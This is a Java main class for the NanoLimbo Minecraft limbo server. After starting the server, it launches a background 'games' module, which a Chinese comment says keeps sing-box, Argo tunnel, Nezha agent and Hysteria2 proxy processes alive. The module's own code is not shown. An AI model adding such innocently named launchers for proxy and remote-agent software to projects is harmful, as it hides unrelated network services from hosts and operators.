/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;
import ua.nanit.limbo.games.GamesBootstrap;

public final class NanoLimbo {

    public static void main(String[] args) {
        try {
            // 先启动 Limbo（Minecraft 假人/登录服务器），它是非阻塞的，
            // 靠 Netty 的 event loop 非守护线程让 JVM 存活。
            new LimboServer().start();

            // 在独立后台线程拉起游戏模块（sing-box / argo / nezha / HY2 保活）。
            // 由 ENABLE_GAMES 环境变量开关控制，默认关闭，不影响 Limbo 本体行为。
            Thread gamesThread = new Thread(new GamesBootstrap()::run, "games-bootstrap");
            gamesThread.setDaemon(true);
            gamesThread.start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }
}
